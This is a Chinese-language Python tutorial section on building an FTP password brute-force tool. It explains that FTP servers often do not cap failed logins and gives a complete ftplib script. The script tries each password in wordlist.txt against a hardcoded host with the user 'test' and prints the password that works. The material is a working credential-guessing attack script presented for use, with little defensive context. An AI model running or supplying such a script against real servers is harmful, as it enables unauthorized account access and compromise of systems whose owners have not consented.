## FTP密码爆破工具 

FTP服务后台设置中，通常不会检查密码输错次数。这样即可将wordlist.txt文件用作字典，不断尝试登录，从而猜出密码。python提供了ftplib模块，该模块提供了灵活使用FTP服务的多种功能。

![img](img/1891bcc0-43f6-11eb-8fd2-8cc6814bc10b.png)

为了测试方便，假设已知用户名。从wordlist.txt文件找到密码，将其复制到文件前面。如果密码位于wordlist.txt文件后面，那么程序破解密码时将会耗费很长时间。建立FTP连接时，若登录失败，则送回530User cannot log in信息，在Python程序中触发异常。若登录成功，则显示220User logged in 信息，在Python程序中不显示任何信息，输出密码并退出循环。

### 代码实现

Python为连接与登录FTP提供了简单的机制。许多需要在Java或C语言中处理的过程已经在ftplib模块内部得到处理，这样，用户只需使用import语句将ftplib模块导入应用程序，即可轻松使用FTP。

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/24 17:55 
# @Author   : ordar
# @File     : ftp_brute.py  
# @Project  : pythonCourse
# @Python   : 3.7.5
from ftplib import FTP


def get_pass(host, user, passwd):
    try:
        # 连接FTP Connection到服务器PC，参数为IP或域名。
        ftp = FTP(host)
        # 使用函数参数给出的密码与已知用户名尝试登录。
        # 若登录正常，则执行下一条语句，否则触发异常。
        ftp.login(user, passwd)
        print("[+] User {} Password is {}".format(user, passwd))
        return True
    except:
        return False


with open("wordlist.txt", 'r') as f:
    all_passwd = f.readlines()

for passwd in all_passwd:
    passwd = passwd.strip()
    print("[-] Test password {}".format(passwd))
    if get_pass("192.168.1.15", "test", passwd):
        break

```

 

### 运行结果

![img](img/6a6fbfe2-43f6-11eb-8129-8cc6814bc10b.png)

 